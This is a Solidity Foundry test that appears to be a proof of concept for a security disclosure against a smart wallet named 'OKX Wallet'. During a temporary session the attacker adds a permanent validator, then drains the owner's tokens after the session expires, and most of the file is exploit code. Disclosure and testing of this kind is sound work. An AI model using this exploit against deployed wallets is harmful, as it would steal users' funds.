// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import "forge-std/Test.sol";

import {WalletCore} from "../src/WalletCore.sol";
import {Storage} from "../src/Storage.sol";
import {ECDSAValidator} from "../src/validator/ECDSAValidator.sol";
import {MockERC20} from "../src/test/MockERC20.sol";
import {Call, Session} from "../src/Types.sol";
import {IWalletCore} from "../src/interfaces/IWalletCore.sol";
import {IStorage} from "../src/interfaces/IStorage.sol";
import {DeployInitHelper, DeployFactory} from "../scripts/DeployInitHelper.sol";
import {Errors} from "../src/lib/Errors.sol";

/**
 * @title PrivilegeEscalation
 * @notice CRITICAL: Temporary session execution can permanently add a validator,
 *         enabling post-expiry theft.
 *
 * Notes for triage:
 * - vm.etch(owner, wallet.code) is used to emulate an EIP-7702-like "EOA becomes
 *   contract" context where the wallet code lives at an EOA address (state persists
 *   at the EOA address).
 * - The exploit does NOT rely on session usage after expiry.
 */
contract PrivilegeEscalation is Test {

    WalletCore wallet;
    Storage storageImpl;
    ECDSAValidator ecdsaValidator;
    MockERC20 token;
    DeployFactory deployFactory;

    address owner;
    uint256 ownerPk;

    address attacker;
    uint256 attackerPk;

    string constant NAME = "OKX Wallet";
    string constant VERSION = "1";

    function setUp() public {
        ownerPk   = 0xA11CE;
        owner     = vm.addr(ownerPk);
        attackerPk = 0xBEEF;
        attacker  = vm.addr(attackerPk);

        // Deploy using factory pattern
        deployFactory = new DeployFactory();
        bytes32 salt = bytes32(0);

        (address storageAddr, address ecdsaAddr, address walletAddr) =
            DeployInitHelper.deployContracts(deployFactory, salt, NAME, VERSION);

        storageImpl   = Storage(storageAddr);
        ecdsaValidator = ECDSAValidator(ecdsaAddr);
        wallet        = WalletCore(payable(walletAddr));

        // Emulate EIP-7702-like account code on an EOA address
        vm.etch(owner, address(wallet).code);

        // Initialize wallet at the EOA address
        vm.prank(owner);
        IWalletCore(owner).initialize();

        // Deploy token + fund "wallet" (owner address)
        vm.prank(owner);
        token = new MockERC20();
        assertEq(token.balanceOf(owner), 1000 ether);
    }

    function test_PostExpiryTheft_HardenedEvidence() public {

        // -----------------------------------------------------------------------
        // 1) Create a temporary session signed by the owner
        // -----------------------------------------------------------------------

        Session memory session;
        session.id        = 1;
        session.executor  = attacker;
        // Self-validation (ECDSA) — address(1) is SELF_VALIDATION_ADDRESS
        session.validator  = address(1);
        session.validAfter = block.timestamp;
        session.validUntil = block.timestamp + 1 hours;
        session.preHook    = "";
        session.postHook   = "";

        bytes32 digest = WalletCore(payable(owner)).getSessionTypedHash(session);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest);
        session.signature = abi.encodePacked(r, s, v);

        // -----------------------------------------------------------------------
        // 2) Escalate privileges DURING session: add attacker as validator permanently
        // -----------------------------------------------------------------------

        Call[] memory calls = new Call[](1);
        calls[0] = Call({
            target: owner, // wallet calls itself
            value:  0,
            data:   abi.encodeWithSignature(
                "addValidator(address,bytes)",
                address(ecdsaValidator),
                abi.encode(attacker)
            )
        });

        vm.prank(attacker);
        IWalletCore(owner).executeFromExecutor(calls, session);

        address validatorAddress = WalletCore(payable(owner)).computeValidatorAddress(
            address(ecdsaValidator),
            abi.encode(attacker)
        );

        // -----------------------------------------------------------------------
        // 3) Expire the session and PROVE session execution is rejected
        // -----------------------------------------------------------------------

        vm.warp(session.validUntil + 1);

        // Critical evidence: session is expired => executeFromExecutor must revert.
        vm.expectRevert(Errors.InvalidSession.selector);
        vm.prank(attacker);
        IWalletCore(owner).executeFromExecutor(calls, session);

        // -----------------------------------------------------------------------
        // 4) Drain funds AFTER expiry via the now-permanent validator (no session used)
        // -----------------------------------------------------------------------

        Call[] memory drain = new Call[](1);
        drain[0] = Call({
            target: address(token),
            value:  0,
            data:   abi.encodeWithSignature("transfer(address,uint256)", attacker, 1000 ether)
        });

        // Create validation data signed by attacker (as validator)
        IStorage storage_ = IStorage(WalletCore(payable(owner)).getMainStorage());
        uint256 nonce = storage_.getNonce();

        bytes32 validationHash = WalletCore(payable(owner)).getValidationTypedHash(nonce, drain);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(attackerPk, validationHash);
        bytes memory validationData = abi.encodePacked(r2, s2, v2);

        // Execute via validator AFTER session expiry
        vm.prank(attacker);
        IWalletCore(owner).executeWithValidator(drain, validatorAddress, validationData);

        // -----------------------------------------------------------------------
        // 5) Impact: funds drained post-expiry
        // -----------------------------------------------------------------------

        assertEq(token.balanceOf(attacker), 1000 ether);
        assertEq(token.balanceOf(owner),    0);
    }
}
